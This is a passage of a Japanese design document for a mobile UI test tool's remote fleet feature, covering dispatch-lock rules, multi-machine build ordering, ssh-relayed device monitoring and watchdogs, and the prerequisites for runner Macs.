  (`run` / `api run` の両方。拡張は設定 `fleetest.remoteWaitLock` から渡す。§18.7)
  (2026-08-18。奪わない。`--force-lock` と併用不可。前提条件は無い(手元の run も dispatch.lock を取る)—
  判定は `RemoteDispatchFlagPolicy` / ポーリング判断は `WaitLockPolling`)
- **時刻で自動的に奪わない**(長い run を殺す)。奪うのは `--force-lock` を明示したときだけで、
  そのとき警告を1行出す。**pid は別マシンのものなので生死判定に使えない = 表示専用**
- ロック情報が読めなくても**ロック自体は尊重する**(壊れた情報で素通ししない)
- 解放は `defer` で必ず行う(成功・失敗・タイムアウトのいずれでも)。**中断でも動くように、
  中断は子へ流して巻き戻す**(§16.1。時間で SIGKILL するとこの `defer` を飛ばす)
- **`fleetest remote unlock --runner <h>`(2026-08-24)**: 既定では自分の死んだディスパッチが残したロック
  **だけ**を外す。走っているかもしれない他人の run のロックは、既定では奪わない(受け手要望: 複数人で
  フリートを共有すると「残ったロックを黙って奪う口」が事故になる)。判定は `RemoteDispatchUnlock.decide`(純粋関数): ロック無し=何もしない /
  info が読めない=外さない(既存の「情報が読めなくてもロックは尊重」)/ 発行者が違う=外さない /
  同じ発行者で発行元がこの機械かつ pid が生きている=外さない(止めれば自分で解放する)/ それ以外=外す。**別の機械の pid の生死は見えない**ので、発行者が自分なら
  本人の申告として外す。heldMessage にこの口を案内する
- **`--runner local` で手元のロックも外せる**(2026-09-21。手元の run も同じロックを取るように
  なったため)。**判定の軸は issuer ではなく `issuerHost`** —— どの証拠が使えるかをそれが決める:
  **①この機械が置いたロック**は pid の生死で確定できる(`decideLocalSweep`。pgrep は呼ばない)/
  **②他人がこの Mac へディスパッチして置いたロック**は控えの pid が**向こうの Mac の pid** なので
  見ず、**その run がこの機械に残っていないか**を `liveDispatchedRunsCommand` の pgrep で確かめる
  (`guardingLiveRemoteRun` と同じ判定を共有)。リモートでは pgrep は pid 判定の裏取りでしかないが、
  **この機械では「守っている run がここに居るか」の確定的な証拠**になる。
  **base を仮定して pgrep しない** —— 発行側の `--remote-dir` は info.json に残らないので、既定の
  `~/fleetest-runner` を仮定すると**別の base へ撃たれた生きているディスパッチを「居ない」と答え、
  守っている run のロックを外す**(1マシン1run が黙って壊れる)。base 無しのパターンは base 指定版の
  上位集合なので、外れても「拾いすぎる = 外さない」側にしか倒れない。
- **`remote unlock --force`(2026-10-03 ユーザー決定)**: 持ち主・生死を問わずロックを外す
  (`RemoteDispatchUnlock.decideForced`。外した相手と取得時刻を出力に残す)。以前は「unlock に奪う口は
  足さない」としていたが、奪う手段が `run --force-lock` にしか無く、**run を伴わない操作(align)では
  他人の止まったロックを外せず ssh で直接消すしかなかった**ため足した。**生死の確認はしない** ——
  他人の Mac の pid はランナーから見えず、ランナー上の pgrep も転送・ビルド中のディスパッチを
  見逃すので、確かめた体裁を作らない。止まっていると**人が確かめたときだけ**使う。
  `Scripts/align.sh --force-lock` がこれを呼ぶ
- **自動回収**: 次のディスパッチ(と、モニター起動時の掃除)は、**この機械から掴んだ自分のロックで
  その pid が死んでいる**ときだけ自動で外す(`RemoteDispatchUnlock.decideAutomaticSweep`)。
  **外す前に、ランナー上でそのディスパッチの run がまだ生きていないかを見る**
  (`RemoteDispatchUnlock.guardingLiveRemoteRun`。unlock も同じ): 手元の pid が死んでもリモートの run は
  生きていることがあり、そこで外すと同じデバイスへ2本目が乗る。判定材料はディスパッチの run が必ず持つ
  引数 `--report-dir <base>/users/<issuer>/work/.fleetest/dispatch/…`(`liveDispatchedRunsCommand`
  = pgrep)。**確かめられない(ssh の失敗)ときも外さない**
- **`--force-lock` は `--runner` / `--fleet` に限らない**(2026-08-18 に緩めた。判定は
  `RemoteDispatchFlagPolicy.forceLockRejection`)。実行プロファイルの devices が持つ `machine` に
  よる自動ディスパッチや、デバイスが複数の機械にまたがるプロファイル(ホスト別の子へ分かれる)
  では `--runner` を打たないので、限定していると**残ったロックを解除する手段が
  `remote clean`(デバイスも止まる)か
  手動削除しか無くなる**(実際に詰まった)。純粋にローカルだけの実行のときだけ打ち間違いとして拒否する

### 複数機械 fan-out はビルドをロックの外に置かない(2026-09-22)

以前は「シナリオ一覧を得るためのビルド → 機械ごとの配分 → dispatch.lock 取得」の順で、
**ロックを取るまでの数十秒(ビルドに変更があれば分単位)が dispatch.lock の外にあった**
(`DeviceMachineRunner.run` / `ApiRunMachineFanout.run`。実測 2026-09-22: run 開始 07:32:09 →
「building … to split the scenarios」→ 配分が出たのが 07:32:34(25 秒)→ そこで初めて
ロックを取りに行く)。効きが3つ: ①占有表示(`monitorLock` / `remote status` の LOCK 欄)が
数十秒〜数分「空き」のまま ②規律③「`swift build` も重い負荷なので直列化する」が防ごうとした
当のもの(重いビルドの並行)が起きる ③§18.9 の FIFO の待機列の順序が実質「ビルドが終わった順」に
なり、先に打った run が後から打った run に追い越される。

**配分にはシナリオ一覧が要る**という構造上の依存(冒頭のフリート実行の説明のとおり)は残るので、
取得を2段に分けた:

1. **待機列のチケットを `ScenarioHost.build` より前に発行し、`setenv(DispatchTicket.environmentKey, …)`
   でプロセスの環境へ書き込む**(`DispatchTicketIssuer.issue`)。ここが FIFO の公平性を担う。
   **発行だけでは効かない** —— 取得側(`RemoteDispatchQueue.resolveTicket(environment:)`)は
   環境変数を見て採るので、書かなければビルド中に取得側が `Date()` で採り直し、その間に列へ
   並んだ別 run に追い越される
2. **手元(`local`)の dispatch.lock だけをビルドの前に先取りし、配分が確定したら
   (local に配られたかどうかに関わらず)無条件で解放する**(`DeviceMachineRunner.run` /
   `ApiRunMachineFanout.run` の一時ロック)。これは「ビルドという重い負荷の直列化」だけのための
   一時的な先取りで、下記(§18.10)の全順序取得とは別物 —— 手放さずに残すと local だけ
   「取得済み」のまま順序の外に出て、下の循環待ちを合成できる形に戻る
3. **本取得は `DispatchPrelock` が local を含めて全順序どおり行う**(変更なし。§18.10)

### 中継・回収時のパス書き換え(手元のルートに対応するのは workDir)

リモートの子が出す絶対パス(NDJSON の `reportPath`・JUnit の `report:`/`worker:`・フックのログ)は
`RemotePathRewrite.rewrite` で手元のパスへ写す。**渡す remoteRoot は `layout.workDir`**
(`<base>/users/<issuer>/work`)であって `base` ではない —— 手元のリポジトリルートに対応するのは
受け手パッケージ = workDir で、base はその2段上。base を渡すと `users/<issuer>/work` が残り、
**手元にも向こうにも存在しないパス**が画面と記録に出る(2026-08-26 の実害: リモート実行のログが
`<手元のクローン>/users/<issuer>/work/…/run-setup.sh` を指し、実際に走ったスクリプトと別物に見えて
原因調査が空転した。§18.2 の発行者ネームスペースを足したときの追随漏れ)。
witness は `RemoteDispatchTests.testRelayRewriteMapsTheRunnerWorkDirOntoTheLocalRepoRoot`。

### プロファイルのリモート対応

- **デバイスの追加・削除**(実装済み。**2026-08-17 に「取得元」セレクタは廃止し、マシン選択は
  「デバイスを選択」ダイアログへ移した**。上記「GUI のホスト指定は実行プロファイルのデバイスへ
  集約した」): 選んだマシンの `api installed-devices` / `api device-catalog` / `api create-device` /
  `api delete-device` を叩く。
  **リモートの `create-device` は `--no-register` を強制する** —— リモート側の
  実行プロファイルへ書いても**次のディスパッチの rsync `--delete` で消える**
  (プロファイルの正は手元)。作成したデバイスは既存の経路で**手元の実行プロファイルへ**登録する。
  引数の組み立ては純粋関数1つ(`deviceCommandArgs`)に閉じ、ローカル取得時は引数を
  1バイトも変えない。
  **経路は §14 の汎用転送(`fleetest --runner <name> <サブコマンド>`)をそのまま使う** —
  カタログ照会用の個別 ssh 実装は書かない。
  **リモートに対する破壊的操作(デバイス作成・削除・`devices down` 相当)は
  §11 と同じ modal 確認を付ける** — 共有ラボでは他人の実行環境を壊し得るため
  (照会系 catalog/installed-devices は確認不要)
- **アプリプロファイル**: appPath の**マシン別上書きは作らない**。実プロファイルの
  appPath は相対パス(`.fleetest/DerivedData/…`・`../sut-ec-mobile/dist/…`)で、
  対等ピア+同一レイアウトなら上書きなしで解決する(レビューで前提誤りを確認)。
  **ただし「同一レイアウト」は成り立たないことがある**(2026-08-16 に実機で確認) ——
  相対 appPath は**リポジトリルート = ランナー機では `<base>/users/<issuer>/work`** に解決されるので、
  開発機が clone 構成(クローン = 作業ディレクトリ)だと**同じ文字列が別の場所を指す**。
  ツール自身の E2E プロジェクト(`E2EAppIOS/dist/…`)がまさにこれで、クローン側にある
  ビルド成果物をランナー機の work からは見られない。加えて appPath のアプリパッケージ自体は
  そもそも rsync の転送対象外(§13「原則: プロファイルの正はローカル・実行時に配布」は
  `TestProjects/<project>` だけを運ぶ)なので、リモートにファイルが存在しなければ
  「同一レイアウトにする」だけでは解決しない。**この2点は §17 の `remoteControl.workspace` で解決した**
  (appPath のマシン別上書きは今も作らない —— 基準ディレクトリを揃える方式のまま)

### 「デバイスモニター」タブの多ホスト監視(**状態と映像は実装済み: 2026-08-17**)

**帯域制御・stale の意味論・watchdog 分界の契約は §11 が正**(ここでは繰り返さない)。
§13 で足すのは実装地点と、リモート特有の2点だけ:

- ホスト別グループ。リモートの `api monitor`/ストリームを ssh 経由で起動し ssh パイプで中継
- **watchdog 分界の実装地点はここ**(§11 の「後付け不可」の期限)。リモート機は無人で
  モニター非常駐のため、**自動修復は発行側の拡張が ssh で撃つ**。「リモートタイルからの
  対話操作は作らない」原則は人間の手動操作の話で、watchdog の自動修復は別枠。
  **2026-09-25 にブリッジ watchdog を分界した**。実装して分かったのは
  **ランナー機に常駐 watchdog を置く必要が無かった**こと —— 修復は既存の lifecycle ジョブ
  (machine を運ぶ)に乗るので、拡張が `remote exec <machine> -- api start-device` を
  撃てば済む。**残るのは健全性 watchdog**(Wi-Fi 修復だけ `api` の口が無く手元の adb 直叩き)
- ssh 常駐の respawn は**ホスト単位のバックオフ**を付ける(ネットワーク断で
  respawn 連打にしない。レビュー指摘)。プロセスタブのリモート分は状態表示のみで
  kill ボタンを出さない(§11)
- 実行の集約通知に **FM 不可ホストでの screenLooksLike 素通り**を明記する(run 末尾の FM 警告の
  中継だけでは複数ホストの出力に埋もれる。レビュー指摘)
- **run の進捗(フリート横断の run ボード)の契約は docs/design.md §18 が正**(供給は機械
  グローバルの台帳 `~/.fleetest/runs/<pid>.json`・中継はこの fan-out に相乗りする
  `monitorRuns`。ここには置かない = 二重管理にしない)

### リモートのデバイスの状態と画面(2026-08-17 実装)

**手元の `api monitor` は simctl/adb を叩くので、この機械のデバイスしか観測できない**。
放っておくとリモートのデバイスは永久に `offline` で、**向こうで起動しても画面が1ミリも変わらない**
(利用者の報告「表示が未起動のままです。起動しようとしたのかどうかわかりません」)。
しかも**同名の手元のデバイスに解決して別の機械の状態と画面を出す**という、もっと悪い形もあった
((machine, name) が一意なら同名は正常な構成なので普通に起きる)。

決めた形は**「手元とリモートで構造を変えない」**:

| | 手元 | リモート |
|---|---|---|
| 状態 | `api monitor` が simctl/adb で観測 | その機械で `api monitor --device-machine local` を1本(`RemoteMonitorFanout`) |
| 映像 | 拡張が配信ヘルパーを直接 spawn | 拡張が `remote exec <runner> -- api device-stream …` を spawn |
| 静止画 | monitorFrame(2秒毎) | 同じ(子の行をそのまま中継) |

**「起動中のデバイス」で出るデバイス**: booted なシミュレータ・起動中の AVD に加え、**接続中の実機**も
合成する(`unregisteredStates`。iOS=`IOSPhysicalDeviceCatalog` / Android=adb の非 emulator serial)。
実機の列挙は **30 秒 TTL でキャッシュ**する —— devicectl と `adb getprop` で 0.5〜1 秒かかり、
既定 2 秒周期の監視には重い(繋ぎ替えは分単位の出来事。**新しい serial を見つけたら TTL を待たずに
引き直す**)。**ブリッジ不在の iOS 実機(state=booted)も出す**(2026-08-26 に方針変更。拡張の
`filterMonitorDevices` から除外規則を外した)—— 繋がっている端末を隠すほうが実態と食い違うため。

**fan-out 先の決め方**(`ApiMonitorCommand.fanoutMachines`): 実行プロファイルを選んでいるときは
**そのプロファイルに居る他機だけ**。選んでいないとき(拡張の「(起動中のデバイス)」= `--profile` 無し)は
**登録簿の全マシン**へ張る —— このモードは実行プロファイルを引かないので、張らないと
**向こうで起動中のデバイスが一覧に出ない**(2026-08-26 の報告。手元のデバイスしか出ずマシンのタグも消える)。
子(`--device-machine` 付き)は常に空 = 入れ子のディスパッチを作らない。
**実行プロファイルに無いリモートのデバイスも devices に足す**(`mergedDevices`)—— listedTargets は
手元のぶんしか無いので、そこで落とすと fan-out の結果が捨てられる。並びは id 順に固定
(辞書の順序に任せるとタイルが毎サイクル並べ替わる)。
- **`--device-machine`**: 「この機械のデバイスとして扱う対象」。リモート機には
  「自分が誰か」を知る手段が無い(マシン登録名は廃止済み)ので**親が明示する**。監視の子へは
  機械名ではなく `local` を渡す(エイリアスはリモートへ出さない = §0 の規律①)。
  仕分けの規則は `ApiMonitorCommand.scope`(pure。`MonitorHostScopeTests`)—— 走査するのは
  自分のぶんだけ / 並べるのは親は全部・子は自分のぶんだけ(両方が出すと拡張の Map で潰し合う)/
  **子は fan-out しない**(入れ子のディスパッチを作らない)
- **観測していないデバイスは `state: "unknown"`**。offline(= 止まっている)と**別の値にする** ——
  同じにすると、向こうで動いていても止まって見える。拡張はこの値のときだけ
  「<host> に届いていません」を出す(契約は `vscode-fleetest/src/monitorDeviceModel.ts` の
  `MonitorDeviceState`)。**リモートだからという理由で表示を変えない** —— 状態が届いていれば
  手元のデバイスと1文字も変わらない表示にする
- **WiFi 越しの分身は隠す(wired 優先)**。実機は WiFi ペアリング済みの Mac 全部から
  `state=connected` に見える(devicectl は localNetwork でも connected)ので、同じ udid が
  「USB で繋がった機械」と「WiFi で見えるだけの機械」の両方から報告される。合流点
  (`ApiMonitorCommand.mergedDevices`)で wired の1枚だけを残し、WiFi 側(`wired == false`)は
  出さない。**wired が1枚も居なければ全部残す**(どれが本物か決められないものを隠すと、
  その実機が一覧から消える)。`wired` は追加フィールドのみで後方互換だが、**子(ランナー)が
  旧版だと `wired` が届かず分身は消えない** = 版を揃えて初めて効く
- **映像は多重化しない。1デバイス = 1本の ssh**。`api device-stream` は宛先(udid / adb serial /
  ブリッジのポート)を向こうで解決して**配信ヘルパーへ `execv` で化ける**ので、
  **stdout に流れるバイト列は手元で直接起こしたときと1バイトも変わらない**。
  だから拡張側は `StreamPipeline` も codec 切替(h264⇔mjpeg)も失敗時の扱いも**そのまま**使える。
  多重化する設計(ホストごとに1本+デバイス id 付きの自作フレーム)も検討したが、
  **新しいワイヤ形式・デコーダ・再同期・欠落処理**が丸ごと増える割に、LAN で得られるのは
  ssh セッション数の削減だけだった(4台で 4 セッション ≒ 数 MB と暗号化の CPU。実測で問題なし)
- **落ちたときはポーリングへ落ちる**。映像が張れない/張り替えに失敗しても、リモートの
  `api monitor` が出す monitorFrame(2秒毎)がタイルを更新し続ける ——
  **配信を止めるだけでフォールバックが成立する**(手元と同じ性質)。
  帯域や CPU が足りない環境では設定の「ポーリングモード」でも同じ状態になる。
  **iOS でこれが成立していなかった**(2026-08-28 に判明): 実行プロファイル未選択のときの
  iOS は「未登録」= ブリッジを持たないので、ブリッジ `/screenshot` を前提とした撮影の対象から
  外れ、**monitorFrame が1枚も出ない**。手元は simstream(udid だけで映る)が覆っていたので
  見えなかったが、配信の張れないデバイスでは画面の出所がゼロになる。現在はブリッジを持たない
  シミュレータを `xcrun simctl io … screenshot` で撮る —— **1サイクル1台の順繰り**
  (`ApiMonitorCommand.simctlCapturePick`)。**間隔の定数は置かない**: simctl は実測 1.7 秒で
  interval(2秒)より長いため、1サイクル1台に固定して追加コストを撮影1回で頭打ちにし、
  更新間隔は対象の台数から決まるようにしてある。配信中(`suppressFrames`)のデバイスは撮らない
  —— **その一覧は機械ごとに組み直して子へ渡す**(`RemoteMonitorFanout.childControlLine`: その機械のぶんだけを
  機械名を外した id で)。素通しだった頃は、手元で配信中のデバイスの id(機械名なし)が**向こうの同名デバイス**に
  当たって simctl の撮影が止まり、リモートの iOS のタイルが「接続中」のまま埋まらなかった(2026-09-30。
  手元とリモートに同名の `iPhone 17 Pro(iOS 27.0)-01` 等が居る構成で顕在化)
- **操作もその機械へ回す**(2026-08-17 のレビューで実バグ)。一括の起動・停止は
  `RemoteDeviceFanout` で分散していたが、**タイル1枚の起動・停止は手元で `api start-device --name`
  を撃っていた** —— `findDevice` は名前だけで引くので、同名のデバイスが別の機械にも居ると
  **別の機械の設定でこの Mac にシミュレータが1台できる**(simctl は無ければ作る)。
  現在は拡張が `remote exec <machine> -- api start-device … --device-machine local` を通し、
  `findDevice` も (machine, name) で引く。**向こうへ渡す値は常に `local`** —— 宛先はもう
  `remote exec` で選んでおり、送ったプロファイルは自分のデバイスを `machine:"local"` に畳んである
  (§0 の規律「引数にエイリアスを出さない」)。**エイリアスを渡すと向こうで一致するエントリが
  無く `device not found: <名前> on <machine>` になる**(2026-08-29 に実機で確認。この文書自身が
  `--device-machine <machine>` と書いていたのを直した)。**`--device-machine` を渡さない呼び出しは、候補が
  複数ある名前なら候補を挙げて止める**(黙って手元を選ばない) —— 版の古い拡張は
  `--device-machine` を付けずに撃つので、既定を手元にすると
  **「M1Max を止めたつもりで手元が止まり、しかも ok:true で成功に見える」**になる
  (2026-08-17 に実際に起きた)。実行プロファイルの参照解決と同じ規律。
  **手元で `--device-machine <他の機械>` を撃つと断る**(start-device / stop-device --name /
  restart-devices)—— 解決したデバイスが他の機械のものなら、本体を手元で走らせずに
  `fleetest remote exec <machine> -- api … --device-machine local` を案内する。この Mac で意味を持つ値は
  `local` だけ(Android は AVD 名が機械をまたいで同じなので、通すと手元の同名 AVD に当たる。
  maintainer-notes §51.9)
  **同じ規律で回すのは起動・停止だけではない** —— プロファイルタブの右クリック「Wipe Data」も
  `remote exec <machine> -- api wipe-device …` を通す(手元で撃つと、同名のデバイスが別の機械にも
  居るとき**手元のデバイスが初期化される**)
- **「全て終了」(実行プロファイル未選択)も分散する**(2026-08-30 の実害)。拡張はこのとき
  `api stop-all-devices` ではなく従来の `fleetest devices down`(全ブリッジ停止 + `simctl shutdown all`
  + 残った qemu の kill = 実行プロファイルに無いデバイスも止める掃討)を呼ぶ。この掃討が手元しか
  見ていなかったので、**監視は登録簿の全マシンへ張るのに停止は手元だけ**という食い違いになり、
  リモートのタイルが1枚も消えなかった。現在は `RemoteDeviceFanout.dispatchSweep` が
  `remote exec <machine> -- devices down --device-machine local` を機械ごとに立てる ——
  **投げる先は `ApiMonitorCommand.fanoutMachines` と同じ**(集合を別に持つと「出ているのに
  止まらないデバイス」が生まれる)。子は `--device-machine local` で走るので入れ子にはならない。
  出力は NDJSON でなくプレーンテキストなので、行頭に `[<machine>]` を付けて中継する。
  **リモートで `devices down` を撃つ側は `--device-machine local` を必ず付ける**
  (`remote clean` がそう)—— 付けないとランナー自身の登録簿を辿って連鎖する。
  **この掃討は run-lease と MCP の印を読んで丸ごと断る**(デバイスを選べないため。`DeviceBooter.sweepRefusal`)——
  判定は分散より前で、手元の `--force` は子へ運ぶ(§18.7「破壊的操作」)
- **名前で引けるのはモニターが知っているデバイスだけ**(2026-08-29)。ランナー側のプロファイル複製が
  更新されるのは**モニターの fan-out 開始時だけ**なので、それ以降に足したデバイス・改名したデバイスを
  名前で撃つと `device not found: <名前>` で必ず失敗する。**タイルの起動・停止はこの穴を踏まない**
  —— タイルはモニターが起動時に読んだデバイスにしか出ないので、押せる名前は必ず同期済み。
  踏むのは**ライブのプロファイルを見ているプロファイルタブ**だけで、そこから撃つ Wipe Data は
  **識別子で撃つ**(`api wipe-device --platform ios --udid <UDID>` /
  `--platform android --avd <ID>`)ことで解決した —— `api delete-device` と同じ契約で、
  プロジェクトも実行プロファイルも参照しない。
  **操作のたびにプロジェクトを送り直す案(`remote exec --sync-project`)は却下** ——
  200 バイトの情報のために毎回 rsync(初回はアプリのパッケージ込みで 170MB)を払い、
  しかも `--delete` でランナー側の複製を毎回揃え直すことになる。**消す対象を名前で指す必要が
  そもそも無い**(消えるのはその AVD ディレクトリ / シミュレータ UDID そのもの)
- **ブリッジ watchdog はリモートのデバイスも見る(2026-09-25 に分界を実装)**。旧: 見ない縮退。
  除外の理由は2つあり、両方とも消えた ——
  ①**修復手段**: lifecycle ジョブは machine を運べる(`{kind:"device", name, op, machine}`)ので、
  リモートは `remote exec <machine> -- api start-device … --device-machine local` で回る。
  §13 が想定していた「その機械に常駐 watchdog を置く」形は**要らなかった** —— 発行側の
  拡張が ssh 越しに撃てば済む(常駐プロセスを1つ増やさずに分界できる)
  ②**同名衝突**: 記録の鍵を `device.id`(= `DeviceMachineGrouping.workerID` で machine 込み)に
  した。name 単位だった頃は**向こうの connected が手元のハングを隠し、向こうの booted が
  手元の健全なデバイスを再起動する**。webview へ出す `bridgeWatch` にも machine を載せる
  (省略 = 手元。落とすと `findTileByName` が同名の手元タイルに当たる)
- **健全性 watchdog(`monitorHealthWatchdog`)はまだ手元だけ**。Wi-Fi 再有効化が拡張からの
  adb 直叩きで、`api` の口が無いため機械へ回せない(`repair-display` は口があるので回せる)。
  足すなら `api repair-wifi --serial` を作り、上と同じ routing に乗せる
- **実機はどちらの watchdog も見ない**(機械に依らない除外)。供給に数分かかり同時起動枠を
  専有し、WiFi の実機は待ち受けが省電力で閉じるので「無応答 → 再供給」を繰り返すだけになる
- **子の死は握りつぶさない**: 落ちたらそのホストの状態は**捨てる**(古い状態を出し続けると、
  向こうが落ちているのに connected と言い続ける)。再接続は 2s → 5s → 15s、
  **起動直後の死が3回続いたら短間隔をやめ、60 秒おきに張り直し続ける**(版が古い機械へ
  無限に短間隔で ssh を張らない・ランナーの再起動から戻れる。回数の上限は置かない。
  `RemoteMonitorFanout.retryPlan`)
- **`remote exec` は何も転送しない**ので、fan-out は**先にプロジェクトを rsync する**
  (`RemoteProjectSync`。転送の規則は run のディスパッチと共有 = 二重に持たない)
- **子の NDJSON には親が machine を入れる**(2026-08-29 に実バグ)。子は `--device-machine local`
  で走る(エイリアスはリモートへ出さない = §0 の規律①)ので、per-device のイベントを
  **machine:null** で返す。そのまま中継すると拡張は同名の**手元のタイル**を書き換えるため、
  機械ごとに2台ずつ起きていても画面上は「全体で2台しか起動していない」ように見える
  (これが「リモートを使っても並列にならない」の正体だった)。現在は
  `RemoteDeviceFanout.machineStamped` が deviceStopping/deviceStarting/deviceFinished に machine を
  入れ、log 行の先頭に `[<machine>]` を付ける —— 監視の `RemoteMonitorFanout.ingest`・run の
  `ApiRunMachineFanout` の rehost と**同じ規律**(中継する側が3つとも machine を埋める)

- **ホストの負荷(MEM/CPU/GPU/Vision/FM)もその機械で採る**(2026-08-28)。手元の `api host-metrics` は
  **この Mac の値しか出せない**ので、リモート機のぶんは拡張が
  `remote exec <machine> -- api host-metrics --interval 1` を**機械ごとに1本**立てて、
  ツールバーのグラフを**機械ごとの行**にする(左端は手元が `local`・以降は機械名。
  行が1つのときはラベルを出さない)。守る規律は3つ:
  **①専用の ssh 経路を書かない**(§14 の汎用転送を使うだけ。配信と同じ)/
  **②行の集合は「直近の monitorDevices に居る機械」で決める**(表示フィルタは通さない ——
  フィルタの出入りで ssh を張り直すと、行が付いたり消えたりするだけのために接続が churn する)/
  **③消えた機械の行は捨てる**(観測が止まったまま最後の値を出し続けない = 状態を
  `state:"unknown"` に戻すのと同じ規律)。
  **サンプル自身に機械名は入っていない** —— 子は向こうで自分の値を出すだけなので、
  spawn した側(`MonitorProcessManager`)が付ける。**FM も同じ hostMetrics ストリームで来る**が、
  host-metrics 自身は FM を叩かない(測る対象を自分で消費してしまう)—— FM を呼んだプロセスが
  `~/.fleetest/fm-usage/<pid>.json` に置いた控えを毎 tick 読む(`FTCore.FMUsageLedger`)。
  **run のイベントからは供給しない**(拡張が起こした run しか見えず、CLI 実行や他人の run が
  0 に見えるため)。FM はその機械の中で許可枠に制限される共有資源
  (performance-tuning.md §3.5)なので、機械ごとに分けて初めて意味を持つ。
  子の死の扱いは監視の子と同じ形
  (起動直後の死が3回続いたら短間隔をやめ、10 分おきに張り直し続ける = 版の古い機械へ短間隔で
  ssh を張らない。`vscode-fleetest/src/hostMetricsRetry.ts`)
  **容量(`MEM 192` / `CPU 24` / `GPU 76`。設定タブで表示を切り替え・既定 OFF)も同じ行で来る** ——
  `cpuCores` / `gpuCores` / `memTotalBytes` は向こうの機械が自分の値を出す(拡張の `os.cpus()` 等では
  リモート行を代われない)。届くまでは `MEM -` で、手元の行を複製した値を引き継がない。
  **align 後も向こうの host-metrics は起動時の古いバイナリのまま**なので、欄を足したら
  向こうの `api host-metrics` を止めて拡張に起こし直させる(止めないと版の食い違いで行が捨てられ続ける)

**版が揃っていないと配信も状態も来ない**(`--device-machine` / `api device-stream` は新しい)。
古い機械は「Unknown option」で即死 → 3回で短間隔をやめる(その後も間隔を空けて張り直す) → 揃うまでタイルは「届いていません」のまま。
`fleetest remote setup <runner>` で揃える。

### 実装順序

| 段 | 内容 | 依存 |
|---|---|---|
| 0 | **暫定対処: `fleetest.remote.hosts`/`remote.target` へ `"scope": "machine"` 付与**(§15.2。移行前の設定乗っ取り防止) | なし。**Phase 1 実装へ即時適用済み(2026-07-31)** |
| 1 | 登録簿の LocalConfig 移行+machine 対応・接続確認・状態表示+**汎用転送 `--runner <サブコマンド>`**(§14) | —。**実装済み: 2026-08-16** |
| 2 | マシンプロファイルタブの取得元セレクタ(段1の汎用転送を使うだけ) | 1。**2026-08-17 に形を変えて決着**(GUI のホスト指定は実行プロファイルのデバイスの `machine` へ集約。上記) |
| 3 | appPath の ssh 実在チェック(上書き機構は作らない) | 1。**未実装**(元の動機は §17 の workspace で解消済み。上記) |
| 4 | フリート定義+`run --fleet`+静的検証(host→machine→デバイス名解決の赤字表示) | 1。**実装済み: 2026-08-16**(分散 `--split` も §8) |
| 5 | 「デバイスモニター」タブ多ホスト化(**状態・静止画・ライブ映像は 2026-08-17 実装済み**。**ブリッジ watchdog の分界は 2026-09-25 実装**。健全性 watchdog は Wi-Fi 修復の口が無く手元だけ) | 1。①〜④と独立に後回し可 |

**results の扱い(2026-08-16 に実測で確認。当初の想定と違う)**: `fleetest results` 系の集計は
`results/runs/` を走査する**ファイルベース**なので、results/ の回収が済んだ時点で
**リモート実行分もそのまま集計に載る**(実測: `results list` に M1Ultra / M1Max の run が
machine 名付きで並ぶ)。「マージの実装」は要らなかった。

ただし**レポートへのリンクだけは壊れていた** —— リモートの run が記録する `reportPath` は
ディスパッチ単位の隔離先(回収後に削除される)を指すため。回収後に記録側を回収先へ
向け直す(`FTRemote.RemoteReportLink`)。

## 14. ランナー機の前提とインストーラー(実装済み: 2026-08-16)

### 前提(明文化)

| 区分 | 前提 | 必須? | 機械検証 |
|---|---|---|---|
| ハード | Apple silicon の実機 Mac(VM は FM 不可の公算大) | 必須 | `sysctl hw.optional.arm64` |
| ツールチェーン | 発行側と同じ Xcode 製品版 + iOS Simulator SDK(ToolchainFingerprint の製品版一致。**build 番号だけの違い=ベータ seed 違いは advisory で止めない**、製品版違いは blocking)。**macOS の版は照合しない**(混在可。ただし OCR・FM は OS 付属なので結果が機械で変わりうる) | 必須(製品版のみ) | 既存適合チェック流用 |
| **運用モード** | **A: FileVault 有効(既定)/ B: FileVault 無効+自動ログイン**(§5。どちらも正式構成) | 必須(いずれか) | `fdesetup status` + `defaults read com.apple.loginwindow autoLoginUser` |
| セッション | **Aqua セッションが立っている**(= コンソールにランナーユーザーがログイン済み)。画面ロックは可 | 必須 | `stat -f%Su /dev/console` がランナーユーザーと一致(**両モード共通**) |
| 電源 | **システムスリープ無効**(ディスプレイスリープは可) | 必須 | `pmset -g` |
| ネットワーク | リモートログイン ON・発行側からの鍵認証(BatchMode)・**画面共有 ON**(モード A の再起動後の解錠に使う。モード B では任意だが復旧用に推奨。preflight は値を出すだけで needs-manual / blocked の判定には使わない) | 必須(画面共有は推奨) | 到達性プローブ(実装済み)+ ポート応答 |
| ツール本体 | **専用ベースディレクトリ配下**(`<base>/foundation-tester` = クローン・`<base>/users/<issuer>/work` = 発行者ごとの WORK_DIR)に導入済みで `swift build` 済み。CLI のみ(拡張・MCP・モニター不要 = CI ランナーと同型)。**マシン自身のローカルインストールとは別物**(§12) | 必須 | `test -x <base>/foundation-tester/.build/debug/fleetest` |
| Android | Android SDK + AVD | レーン使用時 | 既存 preflight 流用 |
| FM | Apple Intelligence 有効化 | screenLooksLike/occlusion-guard 使用時(自己修復は FM を使わないので対象外) | `doctor --fm-only`(実呼び出し) |

**旧版からの変更(2026-07-31 セキュリティレビュー)**: 「自動ログイン+ロック無効」を
無条件必須から外し、**モード A/B の選択+Aqua セッション在否の実測**に置き換えた(§5)。
自動ログインは**モード B の正式構成としてサポートを継続**する(施錠ラボ・EC2 Mac 等)。

### 設計上の決定

1. **インストーラーは sudo/GUI が要る項目を実行しない**(リモートログイン・自動ログイン・
   スリープ・AI 有効化・Xcode 導入)。これらは初回1回の手動ステップ0とし、
   スクリプトは**検証して不足を列挙する**に徹する(無人機に sudo プロンプトを
   混ぜると冪等性と自動化が両方壊れる)
2. **preflight(読み取り判定)と install(実行)を分離**(既存 preflight.sh/install.sh と
   同じ規律)。設定タブの[接続確認]は preflight の exit code 表示に縮退する
3. **「セットアップ成功」の定義は実ディスパッチ1本が通ること**(ビルドが通った、ではない)
4. リモートのマシン登録名は持たない(machine は発行側の登録簿だけが知る。適合チェックも照合しない)
5. **ランナー専用スクリプトを新設しない**(下記「構成」)。新スクリプトは
   SKILL.md との 1:1 同期義務・重複判定の二重管理を1つずつ増やすため、
   既存 `preflight.sh` / `install.sh` の**モード追加で賄う**

### 構成(新規スクリプトを作らない)

```
Scripts/preflight.sh --runner  既存に判定モードを追加(--base <dir>。既定は --remote-dir と
                               同じ ~/fleetest-runner)。共通項目(macOS・Xcode・git/swift)は関数に括り出して両モードから呼ぶ。ランナー固有は
                               コンソールユーザー・スリープ・sshd・画面共有・FileVault/自動
